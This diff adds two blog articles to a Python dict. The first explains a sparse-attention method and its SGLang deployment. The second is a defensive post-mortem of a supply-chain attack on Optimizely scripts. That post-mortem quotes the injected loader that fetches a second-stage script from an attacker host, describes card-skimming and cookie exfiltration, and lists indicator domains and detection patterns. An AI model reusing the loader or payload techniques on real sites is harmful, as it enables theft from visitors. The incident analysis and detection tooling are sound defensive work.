@@ -6,6 +6,411 @@
 """
 
 ARTICLES_EN = {
+'latent-sparse-attention-10m-context-2026': {
+    'tags': ["sparse attention", "long context", "SGLang", "inference cost"],
+    'title': "Latent Sparse Attention: 22.7x faster prefill at 10M tokens, and 98 percent of the time is spent in the indexer | DevTools Blog",
+    'description': "Prefrontal AI and ETH Zurich's Latent Sparse Attention (arXiv:2610.42147) clusters keys hierarchically in a learned latent space so queries only score bucket centroids, dropping the indexer from quadratic to O(T log T). At 10M tokens one attention layer runs 22.7x faster than GLM-5.3-Flash's native sparse attention and 72.4x faster than full attention on Qwen3.8-27B, with end-to-end time-to-first-token gains of 2.2x and 9.2x. Includes a script that back-solves the indexer share from three published data points, putting the crossover near 240,000 tokens, plus the SGLang commands and three launch traps.",
+    'keywords': "Latent Sparse Attention, LSA sparse attention, sparse attention explained, 10M token context, subquadratic attention, attention indexer, how to reduce TTFT, how to reduce time to first token, SGLang deployment tutorial, long context memory usage, D-LSA distillation, N-LSA native training, PaperTrail benchmark, RULER long context evaluation, agent long horizon cost, ultra long context, 10M context window, flash attention alternative",
+    'h1': "At ten million tokens the bottleneck is not attention: 98 percent of the time goes into finding",
+    'summary': "One global attention layer of GLM-5.3-Flash, ten million tokens of prefill: 98 percent of the wall clock is not spent computing attention but deciding which tokens to look at. Latent Sparse Attention clusters keys in a learned latent space and scores bucket centroids, dropping the indexer from quadratic to O(T log T). Includes a script that back-solves the crossover from three published shares and lands near 240,000 tokens.",
+    'body': '''
+<p>One global attention layer of GLM-5.3-Flash. One H200. Ten million tokens of prefill. Ninety-eight percent of the wall clock is not spent computing attention, it is spent deciding which tokens to look at.</p>
+
+<p>That number comes from <em>Latent Sparse Attention: Towards Subquadratic Ultra-Long Context Attention</em> (arXiv:2610.42147, submitted 2026-10-30, revised 2026-11-03), a joint paper from Prefrontal AI and ETH Zurich, with Torsten Hoefler among the authors. Code is Apache-2.0. QbitAI covered it on 2026-11-17 and that is how most Chinese readers met the paper.</p>
+
+<p>I am not going to restate the abstract. One claim matters: the past two years of long-context work have been about making attention look at less, and that part is basically done. What is left is finding the right subset faster, and that term is still quadratic.</p>
+
+<h2>The quadratic term did not disappear, it moved</h2>
+
+<p>Full attention is easy to account for. During prefill every query scores every previous key, so cost is O(T squared). Going from one million to ten million tokens makes the attention part 100 times more expensive.</p>
+
+<p>Sparse attention splits the work: a lightweight indexer picks the k most relevant keys per query, and the real attention only runs on those, so the attention body drops to O(Tk). The first half of that story holds up. The paper includes a clean check: at 128k tokens, letting every query of Qwen3.8-27B see only its truly top-512 keys, about 0.8 percent of all keys, still retains 98 percent of full-attention accuracy on RULER.</p>
+
+<p>The second half is the problem. To know which 512 keys are relevant, the indexer has to score every key first. DeepSeek's DSA, MiniMax's sparse attention, and the block-sparse schemes in GLM and Qwen all reduce the indexer's load by cutting precision, cutting dimensions, or packing four keys into one. Those tricks divide the constant by a few. They do not change the fact that the indexer's work grows linearly with context, so prefill stays quadratic.</p>
+
+<p>Put it as a library: you want 4,096 books out of ten million. Fetching them is fast. The slow part is reading every spine in the building to decide which 4,096.</p>
+
+<p>The paper measures the bill directly. At ten million tokens, if indexer cost went to zero, sparse attention prefill would get another 58 times faster. Most of the compute in this architecture goes into finding books, not reading them.</p>
+
+<h2>Getting the indexer from quadratic to O(T log T)</h2>
+
+<p>LSA stops checking individual keys and starts checking groups of keys. Whether you group is not the interesting question. How you group is.</p>
+
+<p>Existing block-sparse methods usually group by position, packing adjacent keys into a block. That is a library that boxes books by acquisition date and writes one summary per box. A single important book gets buried under a summary written for its irrelevant neighbours. LSA groups by content instead: keys are projected into a learned low-dimensional latent space (64 dimensions in D-LSA), Ward hierarchical clustering groups semantically similar keys into buckets, and each bucket keeps one centroid plus an index table of member positions. At query time the query only scores centroids, picks the best buckets, expands them into concrete keys, and fills the k slots that go to attention.</p>
+
+<p>The flat variant buys a constant factor. The tree variant changes the complexity: buckets are clustered again into higher-level nodes, layer after layer, until the structure is a tree. A query descends from the root keeping only the best-scoring branches at each level, which is beam search over a hierarchy. Each query examines O(log T) centroids, so indexer prefill drops from quadratic to O(T log T). That is where the word subquadratic in the title comes from.</p>
+
+<p>None of this is a new idea. Reformer's LSH buckets and Routing Transformer's clustering both organized keys by content. The difference is that few earlier attempts validated accuracy and speed together above one million tokens. Bucket quality falls apart at that scale, and a bad bucket is worse than no bucket.</p>
+
+<h2>Bolt it onto an existing model, or grow it from scratch</h2>
+
+<p>Two paths. One for models you already have, one for models you are about to train.</p>
+
+<p><strong>D-LSA</strong> freezes every parameter of the base model and adds two small projection matrices per layer, mapping keys and queries into a 64-dimensional index space, then distils the indexer so its scores approximate the original attention distribution. The whole distillation run uses 352 million tokens. For scale: DeepSeek's DSA burned 2.1 billion tokens on the dense warm-up of its indexer alone. Six times less. That is the practical part of D-LSA, because retrofitting a 27B model no longer means retraining the base.</p>
+
+<p>There is also a training-free variant that uses the principal components of the keys as the projection, and on Qwen3.8-27B it lands close to the distilled version. If you want to poke at this before committing hardware, start there.</p>
+
+<p><strong>N-LSA</strong> uses LSA natively during pretraining, trained on the standard next-token loss with no extra projection, no teacher, no auxiliary objective, and no added parameters. It clusters the attention layer's own keys. The team trained a 0.5B hybrid (24 layers, one global attention layer every four, the rest Gated DeltaNet) with a 128k anneal. Validation loss came out at 1.085, exactly matching full attention. At the same sparse budget, NSA scored 1.117, PISA 1.100, sliding-window attention 1.154. On 128k RULER, N-LSA scored 32.2 against 34.7 for full attention, while NSA fell to 19.2 and PISA to 14.6. Forward plus backward on a single layer runs 1.6x faster than the FlashAttention-3 implementation.</p>
+
+<p>That last set is worth pausing on. Sparse attention losing points on RULER has been the quiet cost of the entire compute-saving line of work. Matching full attention on validation loss means N-LSA is not spending its sparse budget on the wrong keys.</p>
+
+<h2>22.7x on one layer, 2.2x end to end</h2>
+
+<p>At ten million tokens, D-LSA makes one layer's prefill 22.7 times faster than GLM-5.3-Flash's native sparse attention and 72.4 times faster than full attention on Qwen3.8-27B. Decode improves 4.6x and 42.5x. The speedup grows with context: 3.5x against GLM at one million tokens, 2.1x at 512k.</p>
+
+<p>But a layer is not a model. Served through SGLang at ten million tokens, time to first token for GLM went from roughly 7.5 minutes to 3.4 minutes, a 2.2x gain with context parallelism on. Qwen3.8-27B went from about 76 minutes to about 8 minutes, 9.2x. GLM only gets 2.2x because it is already a sparse hybrid, and its non-attention layers own most of the clock. LSA cannot touch those. Do the ROI math per model. Multiplying your bill by 22.7 will be wrong.</p>
+
+<p>Accuracy: MMLU-Pro, GPQA-Diamond, AIME25, MATH500 and LongBench v2 all land inside the baseline's 95 percent confidence interval, with no meaningful change in reasoning length. On RULER at 10M, Qwen plus D-LSA scores 63.9 against 59.9 for full attention; GLM plus D-LSA stays within 4 points of its native sparse baseline. Note that GLM's baseline was trained jointly with its sparse attention while D-LSA is distilled onto a frozen model, so the comparison favours the baseline.</p>
+
+<p>What actually made me stop scrolling was a new benchmark called PaperTrail. It plants fictional research threads inside a large body of real 2026 arXiv papers: one fictional paper reports a result, several real papers get paragraphs inserted that cite it, a few weeks later another fictional paper corrects a number and renames the method, and some later papers keep citing the stale value. The model has to find and connect those facts the way a literature review would. At the 10M scale each sample holds 400 to 465 papers. Qwen plus D-LSA scores 29.1 against 19.8 for full attention.</p>
+
+<p>This is not needle-in-a-haystack. It is which-of-two-contradicting-documents-do-you-believe, which is closer to what an agent doing multi-day research actually faces. Full attention scoring 19.8 is the real headline: a long window is not long comprehension. Fitting context into the window and building correct factual dependencies inside it are separate problems, and only the first one is solved by buying more memory.</p>
+
+<table>
+<caption>Index overhead per attention layer at 10M tokens (GLM-5.3-Flash, single H200)</caption>
+<thead><tr><th>Method</th><th>Index memory per layer</th><th>Single-layer prefill</th></tr></thead>
+<tbody>
+<tr><td>D-LSA (tree)</td><td>246 MiB</td><td>22.7x</td></tr>
+<tr><td>GLM-5.3-Flash native sparse</td><td>331 MiB</td><td>1x baseline</td></tr>
+<tr><td>Qwen-style block sparse</td><td>642 MiB</td><td>slower</td></tr>
+</tbody>
+</table>
+
+<h2>Run the numbers before you swap a serving stack</h2>
+
+<p>22.7x is somebody else's model on somebody else's GPU. The question you have is where your workload sits. The paper's figure gives three share points (indexer is 67 percent of prefill at 512k, 79 percent at one million, 98 percent at ten million). Those three points pin down the ratio between the indexer and attention coefficients, which extrapolates to any length:</p>
+
+<pre><code>def share(tokens, a_over_q):
+    # indexer is roughly q*T*T, attention is roughly a*T, so share = 1 / (1 + a/(q*T))
+    return 1.0 / (1.0 + a_over_q / tokens)
+
+POINTS = [(512_000, 0.67), (1_000_000, 0.79), (10_000_000, 0.98)]
+ratios = [t * (1 - s) / s for t, s in POINTS]
+a_over_q = sum(ratios) / len(ratios)
+
+print("a/q estimate (context length where indexer cost equals attention cost):")
+for (t, s), r in zip(POINTS, ratios):
+    print(f"  {t:>10,} tokens  share={s:.2f}  -&gt;  a/q={r:,.0f}")
+print(f"  mean a/q = {a_over_q:,.0f} tokens")
+print()
+print("extrapolated indexer share:")
+for t in (131_072, 262_144, 524_288, 1_048_576, 4_194_304, 10_485_760):
+    s = share(t, a_over_q)
+    print(f"  {t:>10,} tokens  indexer={s*100:5.1f}%  prefill if indexer were free: {1/(1-s):4.1f}x")
+print()
+print(f"crossover: {a_over_q:,.0f} tokens")</code></pre>
+
+<pre><code>$ python indexer_share.py
+a/q estimate (context length where indexer cost equals attention cost):
+     512,000 tokens  share=0.67  -&gt;  a/q=252,179
+   1,000,000 tokens  share=0.79  -&gt;  a/q=265,823
+  10,000,000 tokens  share=0.98  -&gt;  a/q=204,082
+  mean a/q = 240,695 tokens
+
+extrapolated indexer share:
+     131,072 tokens  indexer= 35.3%  prefill if indexer were free:  1.5x
+     262,144 tokens  indexer= 52.1%  prefill if indexer were free:  2.1x
+     524,288 tokens  indexer= 68.5%  prefill if indexer were free:  3.2x
+   1,048,576 tokens  indexer= 81.3%  prefill if indexer were free:  5.4x
+   4,194,304 tokens  indexer= 94.6%  prefill if indexer were free: 18.4x
+  10,485,760 tokens  indexer= 97.8%  prefill if indexer were free: 44.6x
+
+crossover: 240,695 tokens</code></pre>
+
+<p>The crossover sits near 240,000 tokens. Translated: if your prompts usually stay under 128k, the indexer eats a third of prefill and swapping your serving stack buys you little. Once you routinely pass one million tokens, it eats four fifths, and optimising the indexer is the only optimisation left with room in it. Kernel fusion, batching, attention-body tuning all spend their time on the remaining fifth.</p>
+
+<p>One cross-check. The paper reports 58x more headroom at 10M if indexer cost vanished; the 98 percent share implies 50x. The gap is the fixed cost outside the indexer itself, meaning clustering, bucket expansion and position-table lookups, none of which scale with T. Keep the two terms separate in your own cost model and the error stays bounded.</p>
+
+<h2>Actually starting it in SGLang</h2>
+
+<p>LSA ships as an SGLang plugin behind a forked serving image. Shortest path, one H200, Qwen3.8-27B:</p>
+
+<pre><code>docker pull ghcr.io/prefrontal-ai/sglang:lsa-v0.1.0
+
+gh release download d-lsa-weights-v1 -R Prefrontal-AI/latent-sparse-attention --dir ./maps --pattern 'qwen38_27b__long-16k-1M-heavy-key-and-query-d2048.pt'
+mv ./maps/qwen38_27b__long-16k-1M-heavy-key-and-query-d2048.pt ./maps/qwen38.pt
+
+docker run -it --rm --gpus all --shm-size 32g --network host -e HF_HOME=/hf -v $PWD:/ws:ro -v ./maps:/maps:ro -v $HF_HOME:/hf ghcr.io/prefrontal-ai/sglang:lsa-v0.1.0 bash
+
+pip install --no-deps /ws
+
+export LSA='{"lsa": {"projections": "/maps/qwen38.pt", "query_heads": "all"}}'
+python -m sglang.launch_server --model-path Qwen/Qwen3.8-27b --attention-backend fa3 --page-size 1 --disable-prefill-cuda-graph --json-model-override-args "$LSA"</code></pre>
+
+<p>Three traps, all of which you hit at launch:</p>
+
+<ul>
+<li><strong>--disable-prefill-cuda-graph is mandatory.</strong> LSA picks keys on the host during prefill, and CUDA graph capture cannot see that code. Without the flag the server crashes on startup. Decode graphs still work, so disabling prefill capture does not cost you decode throughput.</li>
+<li><strong>causal-conv1d needs a CUDA 12.x nvcc.</strong> CUDA 13 will not compile it. GLM-5.3-Flash's delta-attention layers depend on it and silently fall back to a slower PyTorch kernel without it. B300 is sm_100 and needs 12.8 or newer. If you only want evaluation, skip the build with --no-install-package causal-conv1d.</li>
+<li><strong>No enabled line in the log means it is not on.</strong> The plugin registers through an sglang.srt.plugins entry point and activates itself from the lsa config block; the server prints enabled at startup. If you do not see that line, requests are still using the model's original attention and every number you measure is fiction. The line appears before startup finishes, so wait for /health before sending traffic.</li>
+</ul>
+
+<p>The image ships paper-flat defaults tuned for H200. B300 uses the lsa-v0.1.0-b300 tag. GLM-5.3-Flash needs eight GPUs, with templates under configs/evaluation/accuracy/glm53_flash/.</p>
+
+<p>For two years the competition was about remembering more. The next round may be about finding faster. Indexer complexity is going to be the steepest segment of the cost curve for agents that run for days, and someone just showed that segment can be moved.</p>
+''',
+    'related': [("Where long context really eats memory: three ways to compress the KV cache", "blog/kv-cache-compression-long-context-2026/"), ("A different ledger for the same jump from 1M to 10M: memory cost of a 120B-A12B MoE", "blog/nemotron-3-super-2026/")],
+},
+'optimizely-third-party-script-hijack-2026': {
+    'tags': ["supply chain", "CSP", "third-party scripts", "frontend security"],
+    'title': "Inside the Optimizely supply chain attack: 178 sites, 188 scripts, and a CSP that stopped only 15 percent | DevTools Blog",
+    'description': "On 2026-11-16 an attacker wrote code into the Project JavaScript field of Optimizely Web customers, turning 188 scripts across 178 organisations into delivery vehicles served from their own trusted domain. Zoom, GitLab, BBC, HSBC and IKEA pushed crypto address swapping, card skimming, cookie and screenshot theft, and two iOS exploit chains to visitors. Report URI sampled 256 affected sites and found 24, 15 percent, whose CSP actually stopped the payload, because the two directives that defeat it are what tag managers require. Includes two runnable scripts: a third-party script hash baseline and a CSP surface audit.",
+    'keywords': "Optimizely supply chain attack, third-party script compromise, CSP configuration tutorial, strict-dynamic risk, unsafe-eval danger, script-src best practice, how to detect injected scripts, subresource integrity SRI, frontend supply chain security, Magecart explained, script hash baseline monitoring, Content-Security-Policy in practice, website injected with malicious script, card skimmer detection, Coruna iOS exploit kit, third-party JS audit",
+    'h1': "178 sites were poisoned: only 15 percent of CSP policies blocked the line that did it",
+    'summary': "At 04:21 UTC on 2026-11-16 the Optimizely script on the BBC homepage gained a line. By evening, 188 scripts belonging to 178 organisations were serving visitors from their own trusted domain: swapping crypto wallet addresses, harvesting card numbers, exfiltrating cookies and screenshots, and pushing exploit chains at older iPhones. Report URI sampled 256 affected sites. Twenty-four stopped the payload. The configuration that stopped it happens to be the one tag managers cannot live with.",
+    'body': '''
+<p>At 04:21 UTC on 2026-11-16, the script the BBC loads from cdn.optimizely.com came back with a few extra lines compared to the previous day's snapshot. Same host. Same certificate. Same script tag on the page. The file grew by fewer than 300 bytes.</p>
+
+<p>By 21:52 UTC that evening, Scott Helme of Report URI had fetched 1,611 Optimizely scripts and found 188 of them modified, belonging to 178 organisations: BBC, CNN, Fox News, Zoom, GitLab, Salesforce, Smartsheet, Bitly, HSBC, IKEA, Equifax, Ledger, Air France-KLM, Peacock. Optimizely's own www and login properties were on the list too. The real count is probably higher, since his sample covers only what was publicly reachable. Optimizely confirmed the incident on its status page at 01:02 UTC on 17 November, describing an unauthorised party exploiting a vulnerability in Web Experimentation.</p>
+
+<p>This is worth a post-mortem not because it was large but because it put a risk that usually gets filed under marketing in front of the engineering team. None of those 178 organisations changed their own code. None shipped a release. None received a warning. Their visitors' browsers ran someone else's code anyway.</p>
+
+<h2>What happened, hour by hour</h2>
+
+<table>
+<thead><tr><th>Time (UTC, 11-16)</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td>04:21</td><td>BBC's Optimizely script first seen loading webshell.lol</td></tr>
+<tr><td>05:23</td><td>1688360.cc registered, certificate issued</td></tr>
+<tr><td>08:28</td><td>1688360.cc/track.js first observed on a bbc.com page</td></tr>
+<tr><td>11:20</td><td>Zoom's script modified, per its Last-Modified header</td></tr>
+<tr><td>13:43</td><td>Card skimming module added to track.js</td></tr>
+<tr><td>17:13 to 17:57</td><td>Second iOS host added, exploit iframe pushed to iOS 18.6 and older</td></tr>
+<tr><td>19:24 to 19:59</td><td>Sweep of 1,611 scripts, 186 confirmed infected</td></tr>
+<tr><td>20:40 to 21:52</td><td>Cleanup, leaving one of 188 still serving</td></tr>
+<tr><td>11-17 00:37</td><td>1688360.cc set to clientHold, stops resolving</td></tr>
+</tbody>
+</table>
+
+<p>The payload was rebuilt 26 times that day, each revision adding function and removing nothing. That cadence is itself intelligence: any script integrity check running on a weekly schedule had essentially no chance against this.</p>
+
+<h2>The entry point was a config field, not the CDN</h2>
+
+<p>The way Optimizely Web delivers code shaped the attack. Every customer loads a script from the CDN, of the form cdn.optimizely.com/js/6395285578973184.js. That file contains Optimizely's own runtime, the experiment configuration, and an optional field called projectJS, which holds custom JavaScript the customer writes in the dashboard and expects to run on every page.</p>
+
+<p>The attacker edited that field. Everything else in the file stayed identical, and the file was still served from cdn.optimizely.com with Optimizely's certificate, from a host every affected site already trusted. This is not CDN cache poisoning. It is editing a customer-writable config field inside a trusted file.</p>
+
+<p>The code injected into Zoom's script, in full, is one line of loader:</p>
+
+<pre><code>"projectJS": function(){(function(){try{var s=document.createElement('script');
+s.src='https://1688360.cc/track.js';s.async=true;
+(document.head||document.documentElement).appendChild(s);}catch(e){}})();</code></pre>
+
+<p>That loader has three variants: a plain script tag to the second stage; the same URL base64-encoded and decoded with atob() so that grepping for the domain finds nothing, which is how Smartsheet's script was re-infected after being cleaned; and a full inline copy of the payload that runs through eval if the remote host is blocked.</p>
+
+<p>One more layer is easy to miss. Some customers serve the script from their own domain, such as opt.scheels.com/js/id.js, because the content comes from the same Optimizely project. Those were infected too. Checking only for the CDN hostname misses them.</p>
+
+<p>How the attacker got write access is explicitly unknown. The report lists a compromised Optimizely system, a credential able to reach many customers' projects, or something else, and rules out CDN cache poisoning. That matters because it decides whether this is the vendor's hole or yours, and for 178 customers the answer was the vendor's.</p>
+
+<h2>What the payload did</h2>
+
+<p>Every visitor received the same track.js, with all modules active. Behaviour depended on the device and what the page was doing:</p>
+
+<ul>
+<li><strong>Wallet address substitution.</strong> It matched BTC, ETH and EVM chains, TRON, SOL, TON, LTC, BCH and DOGE addresses, validated the checksum, and replaced them with attacker addresses. The replacement surface covered page text, form fields, links and images, the clipboard on copy and through navigator.clipboard, outbound fetch and XHR, window.open, page navigation, and the iOS share sheet.</li>
+<li><strong>Card skimming.</strong> Added at 13:43, it listened for form submissions and every POST, captured card number with a Luhn check, expiry and CVV, and sent them to 1688360.cc/card.php through navigator.sendBeacon. Cards inside hosted payment iframes, meaning Stripe and Adyen, were unaffected. Cards in the site's own form fields were not.</li>
+<li><strong>Cookies and screenshots.</strong> When it substituted an address near wallet or payment text, it also sent the page URL, document.cookie for cookies without HttpOnly, the original address, and a full-page html2canvas render to 1688360.cc/hit.php.</li>
+<li><strong>iOS exploit chains.</strong> On iPhone and iPad it loaded boot.js from two .icu hosts and picked a chain by OS version: Coruna for 13 through 17, DarkSword for 18.x, fingerprinting only on 26. The Coruna loader is byte-identical to a sample analysed in a separate October campaign. The visible symptom on iOS 18.6 and older was the page reloading itself every 60 seconds, which was the exploit retrying.</li>
+</ul>
+
+<p>By 19:25 UTC on the 16th the attacker wallets had taken in about 7,040 dollars: 0.083 BTC, 17.02 LTC, 662.9 USDT plus 184 TRX on TRON, 0.055 ETH and 82 USDT on BSC. The TRON wallet had been active since March 2026, so this infrastructure predates the campaign. Stolen cards, cookies and iOS access never appear on chain, which makes 7,000 dollars a floor rather than a measure of damage.</p>
+
+<h2>Why none of your scanners fired</h2>
+
+<p>Because from your site's point of view, this attack did not involve you.</p>
+
+<p>Code scanning, SAST, SCA, WAF and deploy monitoring all inspect what you published to your own servers. A third-party script is fetched by the visitor's browser directly from the vendor, so a change to it bypasses every one of those controls. Nothing in your release pipeline compares the bytes at cdn.optimizely.com against anything, because that file is not in your repository.</p>
+
+<p>The second reason is trust written into configuration. A site that loads a script from cdn.optimizely.com almost always lists that host in script-src, which permits every path on that host. The attacker did not need a new domain. He did not use one.</p>
+
+<p>The third reason is time. With 26 rebuilds and the skimmer arriving at 13:43, any weekly hash comparison was likely to sample a clean version.</p>
+
+<h2>256 affected sites, 24 real blocks</h2>
+
+<p>Report URI sampled 256 affected sites for CSP effectiveness. The result is more useful than the incident itself:</p>
+
+<table>
+<thead><tr><th>Outcome</th><th>Sites</th><th>Detail</th></tr></thead>
+<tbody>
+<tr><td>No CSP at all</td><td>68</td><td>Payload runs</td></tr>
+<tr><td>CSP allowed the payload and the exfiltration</td><td>50</td><td>The worst bucket: fully configured, entirely ineffective</td></tr>
+<tr><td>Payload ran, connect-src blocked exfiltration</td><td>17</td><td>Cards stayed put, on-page address swapping still worked</td></tr>
+<tr><td>Payload blocked</td><td>24 (15 percent)</td><td>The only bucket that counts as defended</td></tr>
+</tbody>
+</table>
+
+<p>The two directives that let the payload through happen to be the default posture of the tag manager ecosystem.</p>
+
+<p><strong>strict-dynamic</strong> trusts any script inserted by an already trusted script. Optimizely's snippet inserts track.js, and track.js inherits trust. The directive exists so bundlers do not have to maintain host allowlists. The trade is that the first script on your allowlist gets to decide what else loads.</p>
+
+<p><strong>unsafe-eval</strong> is required by Optimizely's own documentation. It lets the inline fallback copy execute. HSBC is the clean example: the policy blocked the loading of track.js and blocked exfiltration, but the inline copy still ran.</p>
+
+<p>Adding cdn.optimizely.com to your allowlist does nothing on its own, because the malicious code came from that host. What works is a strict script-src with only the hosts you need, no strict-dynamic, no unsafe-eval, plus a narrow connect-src. Both together put you in that group of 24.</p>
+
+<h2>First runnable step: baseline the third-party scripts</h2>
+
+<p>Once you accept that the file is not in your repository, the first move is to put it there, at least as a hash. Record a baseline for every cross-origin script on the page and diff against it on a schedule. Standard library only, two subcommands, and check exits 1 on drift so it drops into CI or cron unchanged.</p>
+
+<pre><code>import hashlib, json, os, sys, urllib.request
+
+SMELL = [b"atob(", b"eval(", b"sendBeacon", b".icu/", b".cc/"]
+
+def script_srcs(html):
+    out = []
+    for chunk in html.split("script")[1:]:
+        tag = chunk.split("&gt;")[0]
+        if "src=" in tag:
+            raw = tag.split("src=")[1].strip()
+            out.append(raw.split()[0].strip('"').strip(chr(39)))
+    return out
+
+def fetch(src, base):
+    if src.startswith("http"):
+        with urllib.request.urlopen(src, timeout=20) as r:
+            return r.read()
+    with open(os.path.join(base, src.lstrip("/")), "rb") as f:
+        return f.read()
+
+def scan(html_path):
+    base = os.path.dirname(os.path.abspath(html_path))
+    html = open(html_path, encoding="utf-8", errors="replace").read()
+    result = {}
+    for src in script_srcs(html):
+        body = fetch(src, base)
+        result[src] = {
+            "sha256": hashlib.sha256(body).hexdigest(),
+            "bytes": len(body),
+            "smells": [s.decode() for s in SMELL if s in body],
+        }
+    return result
+
+if __name__ == "__main__":
+    cmd, html_path = sys.argv[1], sys.argv[2]
+    lock_path = sys.argv[sys.argv.index("--lock") + 1]
+    now = scan(html_path)
+    if cmd == "snapshot":
+        json.dump(now, open(lock_path, "w"), indent=2, sort_keys=True)
+        print(f"locked {len(now)} script(s) -&gt; {lock_path}")
+        sys.exit(0)
+    lock = json.load(open(lock_path))
+    counts = {"OK": 0, "CHANGED": 0, "NEW": 0, "GONE": 0}
+    print(f"{html_path}: {len(now)} script(s)")
+    for src, info in sorted(now.items()):
+        old = lock.get(src)
+        state = "NEW" if old is None else ("CHANGED" if old["sha256"] != info["sha256"] else "OK")
+        counts[state] += 1
+        tail = f"  flags: {', '.join(info['smells'])}" if info["smells"] else ""
+        print(f"  [{state:&lt;7}] {src}  {info['bytes']:,}B  {info['sha256'][:12]}{tail}")
+    for src in sorted(set(lock) - set(now)):
+        counts["GONE"] += 1
+        print(f"  [GONE   ] {src}")
+    print("summary: " + " ".join(f"{k.lower()}={v}" for k, v in counts.items()))
+    sys.exit(1 if counts["CHANGED"] + counts["NEW"] + counts["GONE"] else 0)</code></pre>
+
+<p>I ran it against a vendor script that differs by exactly one line before and after injection. The check output:</p>
+
+<pre><code>$ python script_lock.py snapshot index.html --lock scripts.lock.json
+locked 2 script(s) -> scripts.lock.json
+
+$ python script_lock.py check index.html --lock scripts.lock.json
+index.html: 2 script(s)
+  [OK     ] js/app.4f2a.js  80B  c51a7a5708ce
+  [CHANGED] js/opt.js  240B  7c84155c59a7  flags: .cc/
+summary: ok=1 changed=1 new=0 gone=0
+$ echo $?
+1</code></pre>
+
+<p>Note what it reports: CHANGED, and one flag for a .cc host. No verdict, no alert text. That is the right behaviour. It does not judge, it tells you this byte sequence was not this byte sequence yesterday. A human looks for five seconds. Run it every few minutes or on every deploy, not weekly, because a payload rebuilt 26 times will walk straight past a weekly sample.</p>
+
+<h2>Second step: find out what your CSP actually permits</h2>
+
+<p>Then audit the policy you already have. The snippet below reads three realistic policies and decides whether each one can stop a modified script on a trusted host. The output has two states, PAYLOAD RUNS or BLOCKED, with no middle ground, because the attacker does not offer one.</p>
+
+<pre><code>ALLOW_ALL = {"*", "http:", "https:", "data:", "blob:"}
+
+def parse(policy):
+    out = {}
+    for part in policy.split(";"):
+        part = part.strip()
+        if not part:
+            continue
+        tok = part.split()
+        out[tok[0].lower()] = [t.strip("'").lower() for t in tok[1:]]
+    return out
+
+def audit(policy):
+    d = parse(policy) if policy else {}
+    script = d.get("script-src") or d.get("default-src") or []
+    connect = d.get("connect-src") or d.get("default-src") or []
+    findings = []
+    if not policy:
+        findings.append(("critical", "no CSP, any origin can run scripts"))
+    if "strict-dynamic" in script:
+        findings.append(("critical", "script-src has strict-dynamic: scripts injected by the vendor are trusted"))
+    if "unsafe-eval" in script:
+        findings.append(("critical", "script-src has unsafe-eval: the inline eval fallback still runs"))
+    if "unsafe-inline" in script:
+        findings.append(("high", "script-src has unsafe-inline"))
+    if ALLOW_ALL &amp; set(script):
+        findings.append(("high", "script-src uses a wildcard source"))
+    if not connect:
+        findings.append(("critical", "connect-src unset, data can leave to any host"))
+    elif ALLOW_ALL &amp; set(connect):
+        findings.append(("high", "connect-src allows wildcards, exfiltration unfiltered"))
+    vendor = [h.split("//")[-1] for h in script if "//" in h and "self" not in h]
+    if vendor and "strict-dynamic" not in script:
+        findings.append(("info", f"allowlisted hosts are permitted wholesale: {', '.join(vendor)}"))
+    return not findings or all(f[0] == "info" for f in findings), findings
+
+for name, policy in [
+    ("A no CSP", ""),
+    ("B typical tag manager policy",
+     "default-src 'self'; script-src 'self' 'unsafe-eval' 'strict-dynamic' "
+     "https://cdn.optimizely.com; connect-src 'self' https:;"),
+    ("C strict script-src, narrow connect-src",
+     "default-src 'self'; script-src 'self' https://cdn.optimizely.com; "
+     "connect-src 'self' https://api.example.com; object-src 'none';"),
+]:
+    blocked, found = audit(policy)
+    print(f"[{'BLOCKED' if blocked else 'PAYLOAD RUNS'}] {name}")
+    for level, msg in found:
+        print(f"    {level:&lt;8} {msg}")
+    print()</code></pre>
+
+<pre><code>[PAYLOAD RUNS] A no CSP
+    critical no CSP, any origin can run scripts
+    critical connect-src unset, data can leave to any host
+
+[PAYLOAD RUNS] B typical tag manager policy
+    critical script-src has strict-dynamic: scripts injected by the vendor are trusted
+    critical script-src has unsafe-eval: the inline eval fallback still runs
+    high     connect-src allows wildcards, exfiltration unfiltered
+
+[BLOCKED] C strict script-src, narrow connect-src
+    info     allowlisted hosts are permitted wholesale: cdn.optimizely.com</code></pre>
+
+<p>Policy C is not perfect either. Allowing a host wholesale means any new path on cdn.optimizely.com is still permitted. That is the ceiling of allowlisting: it governs hosts, not content. Governing content leaves two options, SRI or self-hosting.</p>
+
+<p>SRI does not apply here. The numeric segment in an Optimizely script URL is the customer ID, and the file's contents change with experiment configuration, so pinning a hash means randomly breaking live experiments. That is also why the tag manager ecosystem skips SRI across the board.</p>
+
+<p>Self-hosting is different. This site moved every third-party library into a same-origin directory in 2026, and there is no cross-origin script tag on any page. That is not fastidiousness. It is the only defence in this incident that worked at 100 percent: no third-party script, no third-party script compromise. The cost is that you own the upgrade treadmill, and you cannot use tools like Optimizely that have to render on the vendor side.</p>
+
+<h2>If you think you were hit</h2>
+
+<ul>
+<li>Check every Optimizely project's Project JavaScript and every experiment's custom code for 1688360.cc, for atob(, and for any script tag you did not write. The base64 variant will not match on the domain, so search atob( too.</li>
+<li>Treat any card entered into your own form fields on 16 November as compromised and notify accordingly. Cards inside hosted payment iframes were not affected, so the notification scope can be narrowed.</li>
+<li>Rotate every session token and key that lived in a cookie without HttpOnly.</li>
+<li>Audit write access to the Optimizely account: members, API tokens, third-party integrations. Verify each, then rotate.</li>
+<li>Tell iPhone and iPad users to update to iOS 18.7.3 or later, or 26.3 or later. Anyone who made an on-chain transfer from an affected site between October and November should verify the destination address they actually paid.</li>
+<li>Worth putting straight into firewall and DNS blocklists: 1688360.cc, webshell.lol, 5vobauua3ojpklx.icu, eil786npto9u5bq.icu, l7bcsnwc7nzr3uo.icu, linkforge.cc, ios-hack.icu. Code signatures to grep for: window._k7, window.__k7b, data-channel-code="02111110".</li>
+</ul>
+
+<p>One uncomfortable closing note. Among those 178 organisations were 32 banks and 23 SaaS companies. None of them are short on security budget, and all of them run scanners, a WAF and a SOC. Fifteen percent got a real block. The reason is not complicated: those tools watch what you published, and this attack landed on what you trusted. The gap between the two is currently closed by comparing bytes on a schedule and by deleting trust you do not need. The first can be automated. The second requires someone willing to argue with marketing.</p>
+''',
+    'related': [("After the AI reads your code: why the vulnerability ledger still does not clear", "blog/ai-code-audit-triage-2026/"), ("KV caches can be poisoned too: hash collisions in vLLM and SGLang", "blog/llm-cache-poisoning-2026/"), ("Black October 2026: the compounding bill of supply chain, certificates and package poisoning", "blog/php2shell-black-october-2026/")],
+},
+
